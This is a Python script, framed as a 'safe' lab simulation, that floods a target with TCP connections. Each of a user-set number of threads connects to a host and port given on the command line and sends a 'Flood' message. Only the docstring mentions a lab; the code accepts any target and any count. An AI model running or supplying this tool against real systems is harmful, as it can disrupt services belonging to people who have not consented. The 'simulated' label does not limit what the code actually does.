#!/usr/bin/env python3
import socket
import argparse
import threading

def dos_attack(target_ip, target_port, count):
    """
    Simulated DoS attack on local test server.
    Only use in controlled lab environment.
    """
    def attack():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((target_ip, target_port))
            sock.sendall(b"Flood\n")
        except:
            pass
        finally:
            sock.close()

    threads = []
    for _ in range(count):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
    print(f"[+] Simulated {count} requests to {target_ip}:{target_port}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Safe DoS Simulation")
    parser.add_argument("--target", required=True, help="Target host IP")
    parser.add_argument("--port", type=int, default=80, help="Target port (default 80)")
    parser.add_argument("--count", type=int, default=50, help="Number of simulated requests")
    args = parser.parse_args()
    dos_attack(args.target, args.port, args.count)

